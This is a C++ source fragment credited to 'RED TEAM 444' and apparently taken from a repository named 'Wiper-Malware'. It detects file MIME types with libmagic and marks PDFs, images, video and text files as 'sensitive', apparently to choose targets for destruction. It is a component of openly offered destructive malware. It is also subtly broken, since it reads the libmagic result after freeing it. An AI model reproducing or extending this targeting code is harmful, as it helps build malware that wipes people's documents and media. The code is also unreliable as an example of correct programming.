/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <fstream>
#include <magic.h>  // Using libmagic for MIME type detection (can be linked with the library)

// Function to detect file MIME type
std::string detectMimeType(const std::string& filePath) {
    const char* mimeType;
    magic_t magic = magic_open(MAGIC_MIME_TYPE);
    magic_load(magic, NULL);
    mimeType = magic_file(magic, filePath.c_str());
    magic_close(magic);
    return std::string(mimeType);
}

// Check if the file is of a sensitive type based on MIME type detection
bool isSensitiveFileType(const std::string& filePath) {
    std::string mimeType = detectMimeType(filePath);
    return mimeType.find("application/pdf") != std::string::npos ||
           mimeType.find("image/") != std::string::npos ||
           mimeType.find("video/") != std::string::npos ||
           mimeType.find("text/") != std::string::npos;
}
